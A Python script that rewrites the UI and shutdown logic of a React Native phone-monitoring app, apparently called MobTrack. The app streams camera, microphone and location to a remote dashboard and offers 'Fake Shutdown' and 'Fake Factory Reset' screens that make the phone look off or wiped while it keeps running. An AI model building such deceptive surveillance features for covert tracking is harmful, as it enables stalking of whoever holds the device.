import sys

with open('App.tsx', 'r', encoding='utf-8') as f:
    content = f.read()

content = content.replace('const [isListening, setIsListening] = useState(false);\n', '')
content = content.replace('setIsListening(true);\n', '')
content = content.replace('setIsListening(false);\n', '')
content = content.replace('        setIsListening(false);\n', '')

original_config = '''    if (!enabled || seq.length < 2) {
      if (fakeShutdownRunningRef.current) {
        try { await FakeShutdown.stopService(); } catch { }
        try { await FakeShutdown.stopSimMonitor(); } catch { }
        fakeShutdownRunningRef.current = false;
        setFakeShutdownActive(false);
        setStatusMsg(prev => prev.replace('\\n🔒 Fake Shutdown: Active', ''));
      }
      return;
    }'''

new_config = '''    if (!enabled || seq.length < 2) {
      try { await FakeShutdown.stopService(); } catch { }
      try { await FakeShutdown.stopSimMonitor(); } catch { }
      fakeShutdownRunningRef.current = false;
      setFakeShutdownActive(false);
      setStatusMsg(prev => prev.replace('\\n🔒 Fake Shutdown: Active', ''));
      return;
    }'''

if original_config in content:
    content = content.replace(original_config, new_config)
    print("Fixed handleFakeShutdownConfig")
else:
    print("Could not find handleFakeShutdownConfig block")

start_idx = content.find('      {!isListening ? (')
if start_idx != -1:
    end_idx = content.find('      {renderUpdateModal()}', start_idx)
    
    new_ui = '''      <View style={s.box}>
        <Text style={s.success}>Authorized session for: {linkedNumber}</Text>
        {statusMsg ? <Text style={s.status}>{statusMsg}</Text> : null}
        <Text style={s.hint}>
          ✅ A persistent notification shows this session is active.\\n
          📱 The session may continue with the screen off, subject to Android restrictions.\\n
          📸 Camera turns on only after START CAMERA and stays on until STOP CAMERA.\\n
          📹 Live stream sends continuous video frames to the dashboard at ~10fps.\\n
          🎤 The microphone starts only when requested from the linked dashboard.\\n
          📍 Location asks for permission and a visible location notification.\\n
          {isCameraActive ? '🔴 Camera hardware is currently active.\\n' : '⚪ Camera hardware is currently off.\\n'}
          {isVideoStreaming ? '📹 Live video stream is active.\\n' : ''}
          {isLocationActive ? '🔵 Location is currently being shared.\\n' : '⚪ Location sharing is currently off.\\n'}
          {fakeShutdownActive ? '🔒 Fake Shutdown: Active — Power button shows fake screen.\\n' : '🔓 Fake Shutdown: Off\\n'}
          {fakeRecoveryEnabled ? '🚨 Fake Factory Reset: ON — Power+Vol↓ 3s triggers fake recovery.\\n' : '⚪ Fake Factory Reset: Off\\n'}
          🔋 Battery & IMEI availability synced to dashboard.
        </Text>

        <Text style={s.text}>Select features to allow during this session:</Text>
        <View style={s.toggleRow}>
          <Text style={s.toggleLabel}>Live Camera & Video</Text>
          <Switch value={prefCamera} onValueChange={(v) => togglePref('prefCamera', v, setPrefCamera, prefCameraRef)} />
        </View>
        <View style={s.toggleRow}>
          <Text style={s.toggleLabel}>Microphone</Text>
          <Switch value={prefMic} onValueChange={(v) => togglePref('prefMic', v, setPrefMic, prefMicRef)} />
        </View>
        <View style={s.toggleRow}>
          <Text style={s.toggleLabel}>Location Tracking</Text>
          <Switch value={prefLocation} onValueChange={(v) => togglePref('prefLocation', v, setPrefLocation, prefLocationRef)} />
        </View>
        <View style={s.toggleRow}>
          <Text style={s.toggleLabel}>Fake Shutdown & Security</Text>
          <Switch value={prefSecurity} onValueChange={(v) => togglePref('prefSecurity', v, setPrefSecurity, prefSecurityRef)} />
        </View>
        <View style={s.toggleRow}>
          <View style={{ flex: 1 }}>
            <Text style={s.toggleLabel}>🔒 Fake Factory Reset</Text>
            <Text style={{ color: '#888', fontSize: 11, marginTop: 2 }}>
              Hold Power + Vol↓ for 3s → shows fake Recovery screen
            </Text>
          </View>
          <Switch
            value={fakeRecoveryEnabled}
            onValueChange={toggleFactoryReset}
            trackColor={{ false: '#333', true: '#cc0000' }}
            thumbColor={fakeRecoveryEnabled ? '#ff4444' : '#888'}
          />
        </View>

        <View style={{ marginTop: 20 }}>
          <Button title="STOP SERVICE" onPress={handleStop} color="#cc0000" />
        </View>

        <View style={s.versionRow}>
          <Text style={s.versionText}>MobTrack v{currentAppVersion.versionName} (Build {currentAppVersion.versionCode})</Text>
          <TouchableOpacity
            style={s.checkUpdateButton}
            onPress={() => checkForUpdates(false)}
            disabled={isCheckingUpdate}
          >
            <Text style={s.checkUpdateButtonText}>
              {isCheckingUpdate ? 'Checking...' : 'Check for Updates'}
            </Text>
          </TouchableOpacity>
        </View>
        <TouchableOpacity
          onPress={() => {
            const id = hardwareDeviceId || ApkUpdater.getDeviceId();
            Alert.alert('Your Hardware Device ID', id ? ${id}\\n\\n(Share this ID to lock updates to your device only) : 'Could not retrieve Device ID');
          }}
          style={{ marginTop: 8, padding: 6, backgroundColor: '#181818', borderRadius: 6, borderWidth: 1, borderColor: '#333' }}
        >
          <Text
            selectable={true}
            style={{ color: '#00ff88', fontSize: 11, textAlign: 'center', fontWeight: 'bold' }}
          >
            📱 Device ID: {hardwareDeviceId || ApkUpdater.getDeviceId() || 'Tap to view'}
          </Text>
        </TouchableOpacity>
      </View>
'''
    
    content = content[:start_idx] + new_ui + content[end_idx:]
    print("Fixed UI block")
else:
    print("Could not find UI block")

with open('App.tsx', 'w', encoding='utf-8') as f:
    f.write(content)

print("Done")
